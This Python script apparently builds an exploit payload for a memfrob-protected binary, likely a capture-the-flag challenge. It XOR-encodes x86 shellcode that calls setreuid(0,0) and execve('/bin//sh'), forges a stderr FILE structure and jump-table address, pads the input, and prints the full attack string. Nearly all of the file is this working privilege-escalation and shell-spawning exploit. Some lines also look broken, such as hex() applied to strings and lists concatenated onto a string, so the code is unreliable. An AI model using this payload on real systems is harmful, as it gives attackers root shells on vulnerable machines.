import struct
import argparse


class memfrob_lookup_table:
    def __init__(self):
        self.__generate_lookup_table()

    def __generate_lookup_table(self):
        self.lookup_map = dict()
        for i in range(0,256):
            key = hex(i ^ 42)[2:]
            value = hex(i)[2:]
            if len(key) == 1:
                key = "0" + key
            if len(value) == 1:
                value = "0" + value
            self.lookup_map[key] = value
    
    def __get_bytes(self, hex):
        l = len(hex)
        for i in range(0, l, 2):
            yield hex[i:min(i + 2, l)]

    def lookup_word(self, value, printable=False):
        hex = struct.pack("I", value).hex()
        result = list()
        for i in self.__get_bytes(hex):
            result.append(self.lookup_map[i])
        if printable:
            print("{:s}{:s}".format("\\x", "\\x".join(result)))
        return result

    def lookup_single_byte(self, byte_value, printable=False):
        """This is necessary because some part of lookup defaults to 4 bytes
        and the first 3 are just assumed to be 00."""
        result = self.lookup_word(byte_value)[0]
        if printable:
            print("{:s}{:s}".format("\\x", result))
        return result

#parser = argparse.ArgumentParser()
#parser.add_argument("fd_addr", help="Address of fake file descriptor",
#                   type=lambda x: hex(int(x,0))) 
#parser.add_argument("jump_t_addr", help="Address of jump table", type=lambda x: hex(int(x,0)))
#parser.add_argument("shellcode_addr", help="Address of shellcode")
#args = parser.parse_args()


lookup_table = memfrob_lookup_table()


std_err_fd = [
0x86, 0x20, 0xad, 0xfb, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x40, 0x5d, 0xf7, 0xf7,
0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
0x44, 0x68, 0xf7, 0xf7, 0xff, 0xff, 0xff, 0xff,
0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00,
0x00, 0x54, 0xf7, 0xf7, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00 ]

std_err_fd = "".join([lookup_table.lookup_single_byte(i) for i in std_err_fd])

#shellcode_address = lookup_table.lookup_word(addr)



fake_fd_address = lookup_table.lookup_word(0xffddaabb)


shellcode_array = [0x6a, 0x46, 0x58, 0x31, 0xdb, 0x31, 0xc9, 0xcd, 0x80, 0x31, 0xd2, 0x6a, 0x0b, 0x58, 0x52, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0x53, 0x89, 0xe1,0xcd, 0x80]
memfrobbed_shellcode_array = [lookup_table.lookup_single_byte(i) for i in shellcode_array]
hexarray = [hex(i)[2:] if len(hex(i)) == 4 else "0{:s}".format(str(hex(i)[2:])) for i in memfrobbed_shellcode_array]
shellcode = bytearray.fromhex("".join(hexarray)).decode("ISO-8859-1")




jump_t_address = lookup_table.lookup_word(0xffddaabb)

padding = "D"*67

exploit_string = padding
exploit_string += shellcode
exploit_string += std_err_fd
exploit_string += jump_t_address
exploit_string += fake_fd_address

print(exploit_string)









